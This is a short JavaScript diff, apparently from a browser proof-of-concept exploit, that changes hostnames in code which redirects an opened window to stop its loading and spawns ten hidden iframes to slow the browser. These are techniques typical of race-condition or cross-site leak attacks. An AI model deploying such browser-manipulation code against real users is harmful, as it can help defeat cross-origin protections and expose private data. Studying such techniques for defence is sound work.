@@ -253,7 +253,7 @@
       w.location.href !== "about:blank";
     } catch (e) {
       //stop page loading
-      w.location.href = "https://web.facebook.com/csi";
+      w.location.href = "https://www.google.com/csi";
       clearInterval(z);
 
       //Make sure the old content is not cleared
@@ -268,7 +268,7 @@
   function slow() {
     for (i = 0; i < 10; i++) {
       iframe = document.createElement("iframe");
-      iframe.src = "https://www.amazon.com/";
+      iframe.src = "https://web.facebook.com/";
       iframe.style = "display:none";
       document.body.appendChild(iframe);
     }
